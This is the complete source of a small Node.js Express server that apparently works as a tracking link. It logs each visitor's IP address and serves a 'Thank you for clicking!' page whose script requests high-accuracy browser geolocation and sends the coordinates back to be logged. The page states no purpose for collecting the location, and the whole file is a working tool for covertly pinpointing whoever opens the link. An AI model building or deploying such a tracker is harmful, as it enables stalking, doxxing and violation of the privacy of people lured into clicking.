const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

// Parse JSON request bodies sent from the frontend
app.use(express.json());

// Main page route: serves HTML and client-side JavaScript
app.get('/', (req, res) => {
    const userIp = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress;

    console.log("[LOG] Link opened. IP address: " + userIp);

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Visit Recorded</title>
        </head>
        <body>
            <h1>Thank you for clicking!</h1>
            <p>Your visit has been successfully recorded.</p>

            <script>
                // Request precise geolocation from the browser
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const data = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy + " meters"
                            };

                            // Send exact coordinates to the server
                            fetch('/save-location', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(data)
                            });
                        },
                        (error) => {
                            console.log("Geolocation error or permission denied: " + error.message);
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }
            </script>
        </body>
        </html>
    `);
});

// Endpoint to log precise GPS coordinates from the client
app.post('/save-location', (req, res) => {
    const { latitude, longitude, accuracy } = req.body;
    
    console.log(`[GPS LOG] Precise Location - Lat: ${latitude}, Lon: ${longitude} (Accuracy: ${accuracy})`);
    
    res.status(200).json({ status: 'success' });
});

app.listen(PORT, () => {
    console.log("Server is running on port " + PORT);
});
